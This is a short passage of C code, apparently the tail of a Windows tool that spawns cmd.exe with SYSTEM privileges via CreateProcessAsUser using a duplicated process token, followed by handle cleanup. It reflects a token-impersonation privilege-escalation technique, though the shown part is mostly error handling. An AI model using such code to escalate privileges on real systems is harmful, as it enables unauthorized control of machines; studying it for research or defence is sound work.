            NULL,
            NULL,
            &si,
            &pi)) {
        printf("[ERROR] CreateProcessAsUser: error %d\n", GetLastError());
        status = -1;
        goto CLEANUP;
    }

    printf("Created cmd.exe with SYSTEM privileges\n");

CLEANUP:
    if (hProcess)
        CloseHandle(hProcess);
    if (hProcessToken)
        CloseHandle(hProcessToken);
    if (hDuplicatedToken)
        CloseHandle(hDuplicatedToken);
    return status;
